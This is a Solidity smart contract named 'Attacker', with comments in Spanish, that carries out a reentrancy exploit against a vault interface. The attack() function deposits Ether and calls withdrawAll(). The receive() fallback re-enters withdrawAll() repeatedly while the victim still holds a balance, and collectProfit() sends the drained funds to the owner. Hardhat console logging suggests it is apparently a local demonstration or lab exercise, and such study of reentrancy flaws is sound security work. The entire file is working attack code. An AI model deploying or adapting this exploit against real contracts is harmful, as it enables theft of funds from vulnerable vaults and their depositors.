// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "hardhat/console.sol";

interface ICryptoVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attacker {
    ICryptoVault public victim;
    address public owner;

    constructor(address _victim) {
        victim = ICryptoVault(_victim);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Suministra Ether para el ataque");
        victim.deposit{value: msg.value}();
        victim.withdrawAll();
    }

    receive() external payable {
        // Log para la consola de Hardhat
        console.log("--- Reentrada detectada ---");
        console.log("Saldo restante en la victima:", address(victim).balance);

        // Condición: seguir atacando mientras haya fondos y gas
        if (address(victim).balance >= msg.value && gasleft() > 10000) {
            victim.withdrawAll();
        }
    }

    function collectProfit() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}